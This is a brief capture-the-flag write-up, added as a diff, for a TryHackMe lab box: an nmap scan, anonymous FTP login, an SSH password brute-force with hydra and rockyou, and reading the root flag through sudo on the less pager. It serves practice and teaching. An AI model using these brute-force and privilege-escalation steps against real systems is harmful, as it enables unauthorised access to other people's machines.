@@ -1,0 +1,42 @@
+solved: True       |
+platform: Tryhackme|
+--------------------
+[+] Complete WriteUp
+--------------------
+Scanning: 
+nmap -sV -vv <ip>
+port opened: 
+21 > FTP > vsFTPd v 3.1.x
+22 > SSH > openSSH v 7.6p2
+80 > HTTP > Apache v 2.2.x
+OS: ubuntu linux 18.04 LTS
+
+http:
+notthing interesting
+source code > <!--stenography-->
+i think that this hint was a rabbit hole
+
+ftp:
+login > anonymous and passwd blank
+ls > note_to_jake.txt
+get note_to_jake.txt 
+cat note_to_jake.txt > possible user: amy, jake, holt.
+amy says that the jake's password is too weak
+
+ssh:
+bruteforce with hydra and rockyou.txt wordlist at user jake
+password found: *********     /*amy was right lol*/
+ssh jake@<ip> > password *********
+user own
+ls > notthing
+cd /home/ > ls > three users: amy, jake and holt
+cd /amy/ > ls > notthing :(
+cd ../holt/ > ls > user.txt :)
+cat user.txt > FLAG 1'
+sudo -l > jake is allowed to execute /usr/bin/less with sudo (SUID misc)
+assuming that the root flag is usually in /root/root.txt
+sudo /usr/bin/less /root/root.txt > FLAG 2'
+now we can root that box using less but i don't do that
+-----------------------------------------------------------------------
+
+
